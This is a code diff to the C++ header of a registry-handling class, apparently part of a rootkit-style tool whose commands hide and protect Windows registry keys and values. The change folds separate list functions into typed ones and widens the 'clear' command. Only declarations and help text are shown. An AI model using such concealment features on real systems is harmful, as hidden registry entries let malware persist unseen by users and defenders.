@@ -14,6 +14,8 @@ constexpr wchar_t HKCU_SHORT[] = L"HKCU";
 constexpr wchar_t HKCR[] = L"HKEY_CLASSES_ROOT";
 constexpr wchar_t HKCR_SHORT[] = L"HKCR";
 
+typedef std::vector<std::tuple<std::wstring, std::wstring>> RegValueList;
+
 class RegistryHandlerException : public std::runtime_error {
 private:
 	std::string msg;
@@ -32,11 +34,9 @@ private:
 	bool HideKey(_In_ const std::wstring& key, _In_ bool hide);
 	bool ProtectValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool protect);
 	bool HideValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool hide);
-	std::vector<std::wstring> ListProtectedKeys();
-	std::vector<std::wstring> ListHiddenKeys();
-	RegistryQueryResult ListProtectedValues();
-	RegistryQueryResult ListHiddenValues();
-	bool ClearAll();
+	std::vector<std::wstring> ListKeys(_In_ RegItemType type);
+	RegValueList ListValues(_In_ RegItemType type);
+	bool ClearRegItem(_In_ RegItemType type);
 	bool CheckInput(_In_ const std::vector<std::wstring>& params);
 
 public:
@@ -51,7 +51,7 @@ public:
 		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "hide [key] [value] - Hide a a registry key or value" << std::endl;
 		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide | restore] [pid] - Revealing a registry key or value after hiding it" << std::endl;
 		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "list [hidden | protected] [keys | values] - Listing the currently hidden or protected registry keys or values" << std::endl;
-		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "clear - Clear all hidden or protected registry keys or values" << std::endl;
+		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "clear [all | [hidden | protected] [keys | values]] - Clear all hidden or protected registry keys or values" << std::endl;
 	}
 
 	void HandleCommand(_In_ std::string command) override;
